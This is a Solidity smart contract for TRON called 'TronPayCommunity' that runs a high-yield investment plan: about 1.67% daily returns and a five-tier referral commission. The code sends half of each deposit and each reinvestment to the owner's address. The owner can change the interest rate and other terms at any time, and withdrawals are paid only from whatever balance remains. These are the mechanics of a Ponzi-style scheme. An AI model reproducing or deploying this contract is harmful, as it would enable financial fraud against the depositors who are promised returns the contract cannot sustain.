//SourceUnit: tron_pay.sol

pragma solidity ^0.4.25;

contract TronPayCommunity {

    using SafeMath for uint256;

    uint public totalInvested;
    uint public totalInvestors;
    uint public totalRefCommission;
    uint public releaseTime;
    uint public totalWithdrawal;
    uint public totalBalance;
    uint private minDepositAmount = 100000000; //100trx;
    uint private interestRateSec = 193; //0.0000193 second rate, 1.66752 % per day;
    uint private interestDivisionRate = 10000000;
    uint private reinvestPercent = 25; //in percentage;
    uint private availableAmount;
    uint private deductableAmount;

    address owner;    // current owner of the contract

    struct Investor {
        uint userTotalInvested;
        uint userCurrentInvestment;
        uint time;
        uint userTotalProfit;
        uint userCurrentProfit;
        uint userTotalRefCommission;
        uint userCurrentRefCommission;
        uint userTotalWithdrawal;
        uint userTotalAvailable;
        address referFrom;
    }

    struct InvestorRef {
        uint refTier1Count; 
        uint refTier2Count;
        uint refTier3Count;
        uint refTier4Count;
        uint refTier5Count;
    }

    mapping(address => Investor) public Investors;
    mapping(address => InvestorRef) public InvestorReferals;
    address[] public arrUserAddresses;

    constructor() public {
        owner = msg.sender;
        releaseTime = now;
    }

    function register(address userAddress, address refAddress) private{

      Investor storage investor = Investors[userAddress];
      arrUserAddresses.push(userAddress);

      investor.referFrom = refAddress;

      address refAddrTier1 = refAddress;
      address refAddrTier2 = Investors[refAddrTier1].referFrom;
      address refAddrTier3 = Investors[refAddrTier2].referFrom;
      address refAddrTier4 = Investors[refAddrTier3].referFrom;
      address refAddrTier5 = Investors[refAddrTier4].referFrom;

      InvestorReferals[refAddrTier1].refTier1Count = InvestorReferals[refAddrTier1].refTier1Count.add(1);
      InvestorReferals[refAddrTier2].refTier2Count = InvestorReferals[refAddrTier2].refTier2Count.add(1);
      InvestorReferals[refAddrTier3].refTier3Count = InvestorReferals[refAddrTier3].refTier3Count.add(1);
      InvestorReferals[refAddrTier4].refTier4Count = InvestorReferals[refAddrTier4].refTier4Count.add(1);
      InvestorReferals[refAddrTier5].refTier5Count = InvestorReferals[refAddrTier5].refTier5Count.add(1);
    }

    function () external payable {

    }

    function deposit(address refAddress) payable public {
        uint depositAmount = msg.value;

        require(depositAmount >= minDepositAmount, "not minimum amount!");

        Investor storage investor = Investors[msg.sender];

        if (investor.time == 0) {
                
            totalInvestors++;
            if(Investors[refAddress].userTotalInvested >= minDepositAmount){
              register(msg.sender, refAddress);
            }
            else{
              register(msg.sender, owner);
            }
        }
        else{
            updateProfit(msg.sender);
        }

        investor.time = now;
        investor.userTotalInvested = investor.userTotalInvested.add(depositAmount);
        investor.userCurrentInvestment = investor.userCurrentInvestment.add(depositAmount);
        totalInvested = totalInvested.add(depositAmount);

        calculateRefCommission(msg.value, investor.referFrom);        

        if(msg.sender != owner) {
            uint ownerAmount = depositAmount.div(2);
            owner.transfer(ownerAmount);
        }
    }

    function calculateRefCommission(uint256 investedAmount, address referFromAddr) private{

        address referAddrTier1 = referFromAddr;
        address referAddrTier2 = Investors[referAddrTier1].referFrom;
        address referAddrTier3 = Investors[referAddrTier2].referFrom;
        address referAddrTier4 = Investors[referAddrTier3].referFrom;
        address referAddrTier5 = Investors[referAddrTier4].referFrom;

        uint256 currentCommission = 0;

        if(referAddrTier1 != address(0) && referAddrTier1 != owner) {
            currentCommission = (investedAmount.mul(5)).div(100);

            Investors[referAddrTier1].userTotalRefCommission = currentCommission.add(Investors[referAddrTier1].userTotalRefCommission);

            totalRefCommission = totalRefCommission.add(currentCommission);
            referAddrTier1.transfer(currentCommission);

            Investors[referAddrTier1].userCurrentRefCommission = 0;
        }

        if(referAddrTier2 != address(0) && referAddrTier2 != owner) {
            currentCommission = (investedAmount.mul(2)).div(100);           

            Investors[referAddrTier2].userTotalRefCommission = currentCommission.add(Investors[referAddrTier2].userTotalRefCommission);

            totalRefCommission = totalRefCommission.add(currentCommission);
            referAddrTier2.transfer(currentCommission);

            Investors[referAddrTier2].userCurrentRefCommission = 0;
        }

        if(referAddrTier3 != address(0) && referAddrTier3 != owner) {
            currentCommission = (investedAmount.mul(1)).div(100);           

            Investors[referAddrTier3].userTotalRefCommission = currentCommission.add(Investors[referAddrTier3].userTotalRefCommission);

            totalRefCommission = totalRefCommission.add(currentCommission);
            referAddrTier3.transfer(currentCommission);

            Investors[referAddrTier3].userCurrentRefCommission = 0;
        }

        if(referAddrTier4 != address(0) && referAddrTier4 != owner) {
            currentCommission = (investedAmount.mul(1)).div(100);           

            Investors[referAddrTier4].userTotalRefCommission = currentCommission.add(Investors[referAddrTier4].userTotalRefCommission);

            totalRefCommission = totalRefCommission.add(currentCommission);
            referAddrTier4.transfer(currentCommission);

            Investors[referAddrTier4].userCurrentRefCommission = 0;
        }

        if(referAddrTier5 != address(0) && referAddrTier5 != owner) {
            currentCommission = (investedAmount.mul(1)).div(100);           

            Investors[referAddrTier5].userTotalRefCommission = currentCommission.add(Investors[referAddrTier5].userTotalRefCommission);

            totalRefCommission = totalRefCommission.add(currentCommission);
            referAddrTier5.transfer(currentCommission);

            Investors[referAddrTier5].userCurrentRefCommission = 0;
        }
    }

    function getTotalProfit() public view returns (uint) {
      
        uint totalProfit = 0;
        uint investorCount = arrUserAddresses.length;

        for (uint count = 0; count < investorCount; count++) {

            if(Investors[arrUserAddresses[count]].time > 0){
        
                uint secPassed = now.sub(Investors[arrUserAddresses[count]].time);
                if (secPassed > 0) {
                    uint collectProfit = ((Investors[arrUserAddresses[count]].userCurrentInvestment.mul(secPassed.mul(interestRateSec))).div(interestDivisionRate)).div(100);

                    if(collectProfit.add(Investors[arrUserAddresses[count]].userTotalProfit) > (Investors[arrUserAddresses[count]].userTotalInvested.mul(2))){

                        if(Investors[arrUserAddresses[count]].userTotalProfit < Investors[arrUserAddresses[count]].userTotalInvested.mul(2)){
                            collectProfit = Investors[arrUserAddresses[count]].userTotalInvested.mul(2) - Investors[arrUserAddresses[count]].userTotalProfit;
                        }
                        else{
                            collectProfit = 0;
                        }
                    }

                    totalProfit = collectProfit.add(Investors[arrUserAddresses[count]].userTotalProfit).add(totalProfit);
                }
            }
        }

        return totalProfit;
    }

    function getProfit(address userAddress) public view returns (uint) {
      
        Investor storage investor = Investors[userAddress];

        if(investor.time > 0){
        
            uint secPassed = now.sub(investor.time);
            if (secPassed > 0) {
                uint collectProfit = ((investor.userCurrentInvestment.mul(secPassed.mul(interestRateSec))).div(interestDivisionRate)).div(100);

                if(collectProfit.add(investor.userTotalProfit) > (investor.userTotalInvested.mul(2))){

                    if(investor.userTotalProfit < investor.userTotalInvested.mul(2)){
                        collectProfit = investor.userTotalInvested.mul(2) - investor.userTotalProfit;
                    }
                    else{
                        collectProfit = 0;
                    }
                }

                return collectProfit;
            }
            else{
                return 0;
            }
        }
        else{
            return 0;
        }
    }

    function updateProfit(address userAddress) internal {
        Investor storage investor = Investors[userAddress];

        if(investor.time > 0){
        
            uint secPassed = now.sub(investor.time);
            if (secPassed > 0) {
                uint collectProfit = ((investor.userCurrentInvestment.mul(secPassed.mul(interestRateSec))).div(interestDivisionRate)).div(100);

                if(collectProfit > (investor.userCurrentInvestment.mul(2))){
                    collectProfit = investor.userCurrentInvestment.mul(2);
                }

                investor.userTotalProfit = collectProfit.add(investor.userTotalProfit);
                if(investor.userTotalProfit > (investor.userTotalInvested.mul(2))){
                    investor.userTotalProfit = investor.userTotalInvested.mul(2);
                }

                investor.userCurrentProfit = collectProfit.add(investor.userCurrentProfit);
                if(investor.userCurrentProfit > (investor.userCurrentInvestment.mul(2))){
                    investor.userCurrentProfit = investor.userCurrentInvestment.mul(2);
                }

                availableAmount = investor.userCurrentProfit;
                deductableAmount = (availableAmount.mul(reinvestPercent)).div(100);

                investor.userTotalAvailable = availableAmount.sub(deductableAmount);
            }
        }       
    }

    function reinvest() public {
        updateProfit(msg.sender);

        Investor storage investor = Investors[msg.sender];
        uint256 depositAmount = investor.userCurrentProfit;

        require(address(this).balance >= depositAmount);

        investor.userCurrentProfit = 0;
        investor.userTotalAvailable = 0;

        investor.userTotalInvested = investor.userTotalInvested.add(depositAmount);
        investor.userCurrentInvestment = investor.userCurrentInvestment.add(depositAmount);
        investor.time = now;

        totalInvested = totalInvested.add(depositAmount);

        calculateRefCommission(depositAmount, investor.referFrom);

        if(msg.sender != owner) {
            uint ownerAmount = depositAmount.div(2);
            owner.transfer(ownerAmount);
        }
    }

    function withdraw() public {
        updateProfit(msg.sender);

        uint withdrawAmount = Investors[msg.sender].userTotalAvailable;

        require(withdrawAmount > 0);

        if (msg.sender != address(0)) {
            uint contractBalance = address(this).balance;

            if (contractBalance > 0 && contractBalance >= withdrawAmount) {
                uint payout = withdrawAmount;
                totalWithdrawal = totalWithdrawal.add(payout);

                Investor storage investor = Investors[msg.sender];

                investor.userCurrentProfit = 0;
                investor.userTotalAvailable = 0;

                investor.userTotalWithdrawal = investor.userTotalWithdrawal.add(payout);
                investor.time = now;

                msg.sender.transfer(payout);
            }
        }
    }

    function setInterestSecRate(uint256 secondRate) public {
        require(msg.sender == owner);

        uint investorCount = arrUserAddresses.length;
        for (uint count = 0; count < investorCount; count++) {
            updateProfit(arrUserAddresses[count]);

            Investors[arrUserAddresses[count]].time = now;
        }

        interestRateSec = secondRate;
    }

    function setMinDeposit(uint256 minimumDeposit) public {
      require(msg.sender == owner);
      minDepositAmount = minimumDeposit;
    }

    function setReinvestPercent(uint256 percentage) public {
      require(msg.sender == owner);
      reinvestPercent = percentage;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}